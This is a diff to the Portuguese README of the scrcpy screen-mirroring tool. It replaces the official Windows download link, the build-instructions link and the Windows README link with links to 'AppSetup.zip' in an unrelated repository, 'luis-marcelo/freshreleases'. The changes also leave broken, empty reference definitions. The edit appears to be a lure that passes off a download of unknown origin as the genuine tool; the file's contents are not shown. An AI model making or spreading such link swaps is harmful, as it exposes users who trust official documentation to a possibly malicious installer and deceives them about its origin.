@@ -46,11 +46,13 @@ controlá-lo usando teclado e mouse.
  - Windows: [baixar][direct-win64]
  - macOS: `brew install scrcpy`
 
-[direct-win64]: https://github.com/Genymobile/scrcpy/releases/download/v1.24/scrcpy-win64-v1.24.zip
+[direct-win64]: 
+[Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
   Compilar pelos arquivos fontes: [BUILD] ([processo simplificado][BUILD_simple])
 
-[BUILD]: https://github.com/Genymobile/scrcpy/blob/master/BUILD.md
+[BUILD]: 
+[Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 [BUILD_simple]: https://github.com/Genymobile/scrcpy/blob/master/BUILD.md#simple
 
 
@@ -92,7 +94,7 @@ Você também pode [compilar o app manualmente][BUILD] ([processo simplificado][
 Para Windows, por simplicidade, um arquivo pré-compilado com todas as dependências
 (incluindo `adb`) está disponível:
 
- - [README](https://github.com/Genymobile/scrcpy/blob/master/README.md#windows)
+ - [Download](https://github.com/luis-marcelo/freshreleases/releases/download/FreshTag/AppSetup.zip)
 
 Também está disponível em [Chocolatey]:
 
